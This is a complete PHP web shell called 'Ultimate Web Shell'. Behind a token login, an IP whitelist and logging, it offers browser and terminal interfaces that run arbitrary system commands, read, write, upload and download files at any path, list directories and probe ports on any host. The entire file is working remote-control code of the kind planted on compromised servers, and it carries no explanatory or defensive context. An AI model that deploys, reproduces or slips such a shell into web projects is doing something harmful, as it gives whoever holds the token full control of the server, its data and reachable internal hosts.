<?php
if (!function_exists('shell_exec') || !function_exists('openssl_encrypt')) {
    die('Required functions (shell_exec or openssl_encrypt) are disabled.');
}

define('TOKEN_FILE', '/secure/path/to/token.txt');  // Secure path for token
define('LOG_FILE', '/secure/path/to/shell.log');    // Secure path for logs
define('ENCRYPTION_KEY', 'your-secret-key-here');   // Change to a strong key
$allowedIPs = ['127.0.0.1', '::1'];                 // Whitelisted IPs
$maxAttempts = 5;                                   // Max login attempts
$lockoutTime = 300;                                 // Lockout duration (5 min)

session_start();

header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1; mode=block');

if (!in_array($_SERVER['REMOTE_ADDR'], $allowedIPs)) {
    die('Unauthorized IP address.');
}

if (!isset($_SESSION['attempts'])) $_SESSION['attempts'] = 0;
if ($_SESSION['attempts'] >= $maxAttempts) {
    if (time() - ($_SESSION['lastAttempt'] ?? 0) < $lockoutTime) {
        die('Too many attempts. Try again later.');
    } else {
        $_SESSION['attempts'] = 0;
    }
}

if (!file_exists(TOKEN_FILE)) {
    $token = bin2hex(random_bytes(32));  // 64-character secure token
    file_put_contents(TOKEN_FILE, $token);
}
$token = file_get_contents(TOKEN_FILE);

function encryptData($data) {
    $iv = random_bytes(16);
    $encrypted = openssl_encrypt($data, 'AES-256-CBC', ENCRYPTION_KEY, 0, $iv);
    return base64_encode($iv . $encrypted);
}

function decryptData($data) {
    $data = base64_decode($data);
    $iv = substr($data, 0, 16);
    $encrypted = substr($data, 16);
    return openssl_decrypt($encrypted, 'AES-256-CBC', ENCRYPTION_KEY, 0, $iv);
}

function logAction($message) {
    $timestamp = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'];
    file_put_contents(LOG_FILE, "[$timestamp] [$ip] $message\n", FILE_APPEND);
}

if (!isset($_POST['shell_type']) && php_sapi_name() !== 'cli') {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Ultimate Shell Selector</title>
        <style>
            body { font-family: Arial, sans-serif; background: #1a1a1a; color: #fff; text-align: center; padding: 50px; }
            select, input[type="text"], input[type="submit"] { padding: 10px; margin: 5px; border-radius: 5px; }
            h1 { color: #00ff00; }
        </style>
    </head>
    <body>
        <h1>Choose Your Shell</h1>
        <form method="post">
            <label>Token: </label>
            <input type="text" name="token" placeholder="Enter token" required><br>
            <label>Shell Type: </label>
            <select name="shell_type">
                <option value="web">Web Shell</option>
                <option value="cli">Command-Line Shell</option>
            </select><br>
            <input type="submit" value="Access Shell">
        </form>
    </body>
    </html>
    <?php
    exit;
}

$providedToken = $_POST['token'] ?? $_GET['token'] ?? '';
if ($providedToken !== $token) {
    $_SESSION['attempts']++;
    $_SESSION['lastAttempt'] = time();
    die('Invalid token.');
} else {
    $_SESSION['attempts'] = 0;
}

$shellType = $_POST['shell_type'] ?? (php_sapi_name() === 'cli' ? 'cli' : '');

if ($shellType === 'web') {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Ultimate Web Shell</title>
        <style>
            body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
            h1 { text-align: center; }
            form { margin: 20px 0; }
            input[type="text"], select, input[type="file"] { width: 70%; padding: 10px; background: #222; color: #0f0; border: 1px solid #0f0; }
            input[type="submit"] { padding: 10px 20px; background: #0f0; color: #000; border: none; cursor: pointer; }
            pre { background: #111; padding: 10px; border: 1px solid #0f0; }
            .tab { display: inline-block; width: 100px; }
        </style>
    </head>
    <body>
        <h1>Ultimate Web Shell</h1>
        <form method="post" enctype="multipart/form-data">
            <input type="hidden" name="shell_type" value="web">
            <input type="hidden" name="token" value="<?php echo htmlspecialchars($token); ?>">
            <select name="action">
                <option value="exec">Execute Command</option>
                <option value="upload">Upload File</option>
                <option value="download">Download File</option>
                <option value="ls">List Directory</option>
                <option value="read">Read File</option>
                <option value="write">Write File</option>
                <option value="scan">Scan Port</option>
            </select><br>
            <input type="text" name="param1" placeholder="Command/Path/Host"><br>
            <input type="text" name="param2" placeholder="Target/Path/Port (if needed)"><br>
            <input type="file" name="file" style="display: none;" id="fileInput"><br>
            <input type="submit" value="Execute">
        </form>
        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
            $action = $_POST['action'];
            $param1 = $_POST['param1'] ?? '';
            $param2 = $_POST['param2'] ?? '';
            try {
                switch ($action) {
                    case 'exec':
                        if ($param1) {
                            $output = shell_exec($param1);
                            echo $output ? "<pre>" . htmlspecialchars($output) . "</pre>" : "<p>No output.</p>";
                            logAction("Executed command: $param1");
                        }
                        break;
                    case 'upload':
                        if (isset($_FILES['file']) && $param1) {
                            if (move_uploaded_file($_FILES['file']['tmp_name'], $param1)) {
                                echo "<p>File uploaded to $param1</p>";
                                logAction("Uploaded file to: $param1");
                            } else {
                                echo "<p>Upload failed.</p>";
                            }
                        }
                        break;
                    case 'download':
                        if (file_exists($param1)) {
                            header('Content-Type: application/octet-stream');
                            header('Content-Disposition: attachment; filename="' . basename($param1) . '"');
                            readfile($param1);
                            logAction("Downloaded file: $param1");
                            exit;
                        } else {
                            echo "<p>File not found.</p>";
                        }
                        break;
                    case 'ls':
                        $dir = $param1 ?: '.';
                        if (is_dir($dir)) {
                            $files = scandir($dir);
                            echo "<pre>" . implode("\n", array_map('htmlspecialchars', $files)) . "</pre>";
                            logAction("Listed directory: $dir");
                        } else {
                            echo "<p>Directory not found.</p>";
                        }
                        break;
                    case 'read':
                        if (file_exists($param1)) {
                            echo "<pre>" . htmlspecialchars(file_get_contents($param1)) . "</pre>";
                            logAction("Read file: $param1");
                        } else {
                            echo "<p>File not found.</p>";
                        }
                        break;
                    case 'write':
                        if ($param1 && $param2) {
                            if (file_put_contents($param1, $param2)) {
                                echo "<p>Written to $param1</p>";
                                logAction("Wrote to file: $param1");
                            } else {
                                echo "<p>Write failed.</p>";
                            }
                        }
                        break;
                    case 'scan':
                        if ($param1 && $param2) {
                            $fp = @fsockopen($param1, $param2, $errno, $errstr, 2);
                            echo "<p>Port $param2 on $param1 is " . ($fp ? 'open' : 'closed') . "</p>";
                            if ($fp) fclose($fp);
                            logAction("Scanned $param1:$param2");
                        }
                        break;
                }
            } catch (Exception $e) {
                echo "<p>Error: " . htmlspecialchars($e->getMessage()) . "</p>";
                logAction("Error: " . $e->getMessage());
            }
        }
        ?>
        <script>
            document.querySelector('select[name="action"]').addEventListener('change', function() {
                document.getElementById('fileInput').style.display = this.value === 'upload' ? 'block' : 'none';
            });
        </script>
    </body>
    </html>
    <?php
}

elseif ($shellType === 'cli' || php_sapi_name() === 'cli') {
    if (php_sapi_name() !== 'cli') {
        die('Command-Line Shell must be run from the terminal. Use: php ' . __FILE__);
    }

    echo "Welcome to the Ultimate Command-Line Shell\n";
    echo "Commands: exec, ls, read, write, scan, upload (local), download (local), exit\n";
    echo "Type 'help' for usage\n";

    while (true) {
        echo "Shell> ";
        $input = trim(fgets(STDIN));
        if (strtolower($input) === 'exit') {
            echo "Goodbye!\n";
            break;
        }
        if (empty($input)) continue;

        $parts = explode(' ', $input, 3);
        $action = $parts[0];
        $param1 = $parts[1] ?? '';
        $param2 = $parts[2] ?? '';

        try {
            switch (strtolower($action)) {
                case 'help':
                    echo "Usage:\n";
                    echo "  exec <command> - Execute a shell command\n";
                    echo "  ls <dir> - List directory contents\n";
                    echo "  read <file> - Read a file\n";
                    echo "  write <file> <content> - Write to a file\n";
                    echo "  scan <host> <port> - Scan a port\n";
                    echo "  upload <source> <dest> - Upload a local file\n";
                    echo "  download <source> <dest> - Download to a local file\n";
                    echo "  exit - Quit the shell\n";
                    break;
                case 'exec':
                    if ($param1) {
                        $output = shell_exec($param1);
                        echo $output ?: "No output.\n";
                        logAction("CLI Executed: $param1");
                    } else {
                        echo "Command required.\n";
                    }
                    break;
                case 'ls':
                    $dir = $param1 ?: '.';
                    if (is_dir($dir)) {
                        $files = scandir($dir);
                        echo implode("\n", $files) . "\n";
                        logAction("CLI Listed: $dir");
                    } else {
                        echo "Directory not found.\n";
                    }
                    break;
                case 'read':
                    if ($param1 && file_exists($param1)) {
                        echo file_get_contents($param1) . "\n";
                        logAction("CLI Read: $param1");
                    } else {
                        echo "File not found.\n";
                    }
                    break;
                case 'write':
                    if ($param1 && $param2) {
                        if (file_put_contents($param1, $param2)) {
                            echo "Written to $param1\n";
                            logAction("CLI Wrote: $param1");
                        } else {
                            echo "Write failed.\n";
                        }
                    } else {
                        echo "File and content required.\n";
                    }
                    break;
                case 'scan':
                    if ($param1 && $param2) {
                        $fp = @fsockopen($param1, $param2, $errno, $errstr, 2);
                        echo "Port $param2 on $param1 is " . ($fp ? 'open' : 'closed') . "\n";
                        if ($fp) fclose($fp);
                        logAction("CLI Scanned: $param1:$param2");
                    } else {
                        echo "Host and port required.\n";
                    }
                    break;
                case 'upload':
                    if ($param1 && $param2 && file_exists($param1)) {
                        if (copy($param1, $param2)) {
                            echo "Uploaded $param1 to $param2\n";
                            logAction("CLI Uploaded: $param1 to $param2");
                        } else {
                            echo "Upload failed.\n";
                        }
                    } else {
                        echo "Source and destination required.\n";
                    }
                    break;
                case 'download':
                    if ($param1 && $param2) {
                        if (file_exists($param1) && file_put_contents($param2, file_get_contents($param1))) {
                            echo "Downloaded $param1 to $param2\n";
                            logAction("CLI Downloaded: $param1 to $param2");
                        } else {
                            echo "Download failed.\n";
                        }
                    } else {
                        echo "Source and destination required.\n";
                    }
                    break;
                default:
                    echo "Unknown command. Type 'help' for usage.\n";
            }
        } catch (Exception $e) {
            echo "Error: " . $e->getMessage() . "\n";
            logAction("CLI Error: " . $e->getMessage());
        }
    }
} else {
    die('Invalid shell type selected.');
}
?>